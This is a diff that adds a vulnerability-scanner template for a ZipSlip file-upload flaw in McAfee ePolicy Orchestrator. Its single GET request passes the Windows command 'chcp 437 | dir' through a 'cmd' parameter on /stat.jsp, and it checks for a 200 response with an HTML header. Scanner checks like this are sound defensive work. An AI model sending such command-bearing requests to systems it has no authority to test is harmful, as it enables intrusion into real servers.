@@ -1,0 +1,23 @@
+id: mcafee-epo-rce
+brief:
+    title: McAfee ePolicy Orchestrator - Arbitrary File Upload
+    by: dwisiswant0
+    level: high
+    about: McAfee ePolicy Orchestrator (ePO) is vulnerable to a ZipSlip vulnerability which allows arbitrary file upload when archives are unpacked if the names of the packed files are not properly sanitized....
+    label:
+        - mcafee
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/stat.jsp?cmd=chcp+437+%7c+dir'
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
